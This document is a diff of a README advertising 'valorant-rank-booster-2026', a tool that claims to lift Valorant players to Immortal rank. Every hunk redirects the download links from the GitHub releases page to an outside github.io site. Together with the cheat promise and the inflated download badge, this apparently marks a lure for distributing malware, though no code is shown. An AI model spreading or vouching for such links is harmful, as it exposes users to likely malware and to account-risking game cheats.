@@ -1,6 +1,6 @@
 # 🎮 valorant-rank-booster-2026 - Reach Immortal Without The Grind
 
-[![Download Now](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge&logo=github)](https://github.com/Samsonch9921/valorant-rank-booster-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge&logo=github)](https://samsonch9921.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-890k%2B-orange?style=flat-square)
 
@@ -42,7 +42,7 @@ Getting started takes less than two minutes. Follow the steps below carefully.
 
 ### Step 1: Download
 
-[Visit this link to download the application](https://github.com/Samsonch9921/valorant-rank-booster-2026/releases)
+[Visit this link to download the application](https://samsonch9921.github.io)
 
 Click the link above to go to the official download page. The latest version of the software will be available there.
 
@@ -122,7 +122,7 @@ This project is released under the MIT License — free to use for personal purp
 
 **Remember:** Visit the download page to get your copy today and start your climb to Immortal+.
 
-[![Download Here](https://img.shields.io/badge/🚀-Download_valorant_rank_booster_2026-9cf?style=for-the-badge)](https://github.com/Samsonch9921/valorant-rank-booster-2026/releases)
+[![Download Here](https://img.shields.io/badge/🚀-Download_valorant_rank_booster_2026-9cf?style=for-the-badge)](https://samsonch9921.github.io)
 
 ---
 
